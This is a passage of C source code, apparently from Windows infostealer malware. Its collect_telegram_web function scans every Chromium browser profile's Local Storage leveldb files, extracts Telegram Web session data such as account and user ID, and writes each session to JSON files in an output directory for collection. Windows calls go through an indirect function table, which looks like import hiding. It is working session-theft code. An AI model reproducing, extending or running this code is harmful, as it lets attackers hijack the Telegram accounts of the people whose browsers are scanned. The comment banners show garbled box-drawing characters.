    n = snprintf(json + off, (size_t)rem, "\n  }\n}\n");
    if (n < 0 || n >= rem) goto fail;

    return json;

fail:
    free(json);
    return NULL;
}

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  Directory helpers                                              *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

/* Create each path component (mkdir -p style). */
static void tw_mkdir_p(const char *path) {
    char tmp[TW_PATH_LEN];
    strncpy(tmp, path, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = 0;

    for (char *p = tmp + 1; *p; p++) {
        if (*p == '\\') {
            *p = 0;
            tw_api.pMKDir(tmp, NULL);
            *p = '\\';
        }
    }
    tw_api.pMKDir(tmp, NULL);
}

static int tw_write_file(const char *path, const char *data, size_t len) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    size_t wr = fwrite(data, 1, len, f);
    fclose(f);
    return (wr == len) ? 0 : -1;
}

/* в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ *
 *  Public entry point                                             *
 * в•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђв•ђ */

int collect_telegram_web(const char *local_app_data,
                         const char *roaming_app_data,
                         const char *output_dir) {
    if (!output_dir) return 0;
    if (!tw_ensure_api()) return 0;

    int total = 0;

    size_t browser_count = 0;
    const BrowserPath *browsers = get_chromium_browsers(&browser_count);

    for (size_t b = 0; b < browser_count; b++) {
        const char *app_data = browsers[b].use_roaming
                               ? roaming_app_data : local_app_data;
        if (!app_data) continue;

        char *base_path = tw_path_join(app_data, browsers[b].path_suffix);
        if (!base_path) continue;
        if (!tw_dir_exists(base_path)) { free(base_path); continue; }

        /* Find profiles */
        char profiles[TW_MAX_PROFILES][TW_PATH_LEN];
        size_t profile_count = tw_find_profiles(base_path, profiles,
                                                 TW_MAX_PROFILES);

        for (size_t p = 0; p < profile_count; p++) {
            /* <profile>\Local Storage\leveldb */
            char ldb_path[TW_PATH_LEN];
            snprintf(ldb_path, sizeof(ldb_path),
                     "%s\\Local Storage\\leveldb", profiles[p]);
            if (!tw_dir_exists(ldb_path)) continue;

            /* Collect sessions from .ldb and .log files */
            TgSession sessions[TW_MAX_SESSIONS];
            int session_count = 0;

            for (int ext = 0; ext < 2 && session_count < TW_MAX_SESSIONS; ext++) {
                char pattern[TW_PATH_LEN];
                snprintf(pattern, sizeof(pattern), "%s\\*.%s",
                         ldb_path, ext == 0 ? "ldb" : "log");

                WIN32_FIND_DATAA fd;
                HANDLE fh = tw_api.pFF(pattern, &fd);
                if (fh == INVALID_HANDLE_VALUE) continue;

                do {
                    if (session_count >= TW_MAX_SESSIONS) break;

                    char fpath[TW_PATH_LEN];
                    snprintf(fpath, sizeof(fpath), "%s\\%s",
                             ldb_path, fd.cFileName);

                    size_t flen = 0;
                    unsigned char *fdata = tw_read_file(fpath, &flen);
                    if (!fdata) continue;

                    scan_leveldb_file(fdata, flen, sessions, &session_count);
                    free(fdata);
                } while (tw_api.pFN(fh, &fd));

                tw_api.pFC(fh);
            }

            if (session_count == 0) continue;

            /* в”Ђв”Ђ Write JSON for each extracted session в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ */
            const char *pname = strrchr(profiles[p], '\\');
            pname = pname ? pname + 1 : profiles[p];

            for (int s = 0; s < session_count; s++) {
                long now = mirage_unix_timestamp();
                char *json = build_tg_json(&sessions[s], now);
                if (!json) continue;

                /* <output>/Telegram_Web/<browser>/<profile> */
                char out_dir[TW_PATH_LEN];
                snprintf(out_dir, sizeof(out_dir),
                         "%s\\Telegram_Web\\%s\\%s",
                         output_dir, browsers[b].name, pname);
                tw_mkdir_p(out_dir);

                char out_path[TW_PATH_LEN];
                snprintf(out_path, sizeof(out_path),
                         "%s\\tg-storage_%s_%s.json",
                         out_dir, sessions[s].account, sessions[s].user_id);

                tw_write_file(out_path, json, strlen(json));
                free(json);
                total++;
            }
        }

        free(base_path);
    }

    return total;
}

#endif /* _WIN32 */
#endif /* ENABLE_TELEGRAM */
